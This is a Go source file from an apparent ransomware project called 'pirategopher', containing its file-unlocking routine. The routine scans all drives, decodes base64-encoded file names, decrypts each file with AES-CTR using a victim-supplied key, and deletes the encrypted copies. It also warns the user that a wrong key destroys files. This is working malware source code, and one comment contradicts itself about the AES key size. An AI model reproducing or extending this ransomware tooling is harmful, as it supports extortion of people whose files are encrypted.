package pirategopher

import (
	"crypto/aes"
	"crypto/cipher"
	"encoding/base64"
	"fmt"
	"io"
	"log"
	"os"
	"path/filepath"
	"strings"
)

func StartUnlocker(key string) {
	fmt.Println("Note: \nIf you are trying a wrong key your files will be decrypted with broken content irretrievably, please don't try keys randomly\nYou have been warned")
	fmt.Println("Continue? Y/N")

	var input rune
	_, err := fmt.Scanf("%c\n", &input)
	if err != nil {
		log.Fatal(err)
	}

	if input != 'Y' {
		os.Exit(2)
	}

	go walkDrives(getDrives())
	fileTracker.Add(numWorkers)
	startDecryption(numWorkers, key)
	fileTracker.Wait()
}

func startDecryption(numWorkers int, key string) {
	for i := 0; i < numWorkers; i++ {
		go decryptFiles(key)
	}
}

func decryptFiles(key string) {
	for file := range fileTracker.Files {
		encodedFileName := file.Name()[:len(file.Name())-len("."+file.Extension)]
		filepathWithoutExt := file.FullPath[:len(file.FullPath)-len(filepath.Ext(file.FullPath))]
		decodedFileName, err := base64.StdEncoding.DecodeString(encodedFileName)
		if err != nil {
			log.Println(err)
			continue
		}
		newPath := strings.Replace(filepathWithoutExt, encodedFileName,
			string(decodedFileName), - 1)
		outFile, err := os.OpenFile(newPath, os.O_WRONLY|os.O_CREATE|os.O_TRUNC, 0600)
		if err != nil {
			log.Println(err)
			continue
		}
		err = file.decryptFile(key, outFile)
		if err != nil {
			log.Println(err)
			continue
		}
		err = os.Remove(file.FullPath)
		if err != nil {
			log.Println(err)
			continue
		}
		outFile.Close()
	}
	fileTracker.Done()
}

// Decrypt the file content with AES-CTR with the given key
// sending then to dst
func (file *PirateFile) decryptFile(key string, dst io.Writer) error {
	// Open the encrypted file
	inFile, err := os.Open(file.FullPath)
	if err != nil {
		return err
	}
	defer inFile.Close()

	// Create a 128 bits cipher.Block for AES-256
	block, err := aes.NewCipher([]byte(key))
	if err != nil {
		return err
	}

	// Retrieve the iv from the encrypted file
	iv := make([]byte, aes.BlockSize)
	inFile.Read(iv)

	// Get a stream for encrypt/decrypt in counter mode (best performance I guess)
	stream := cipher.NewCTR(block, iv)

	// Open a stream to decrypt and write to dst
	reader := &cipher.StreamReader{S: stream, R: inFile}

	// Copy the input file to the dst, decrypting as we go.
	if _, err = io.Copy(dst, reader); err != nil {
		return err
	}

	return nil
}

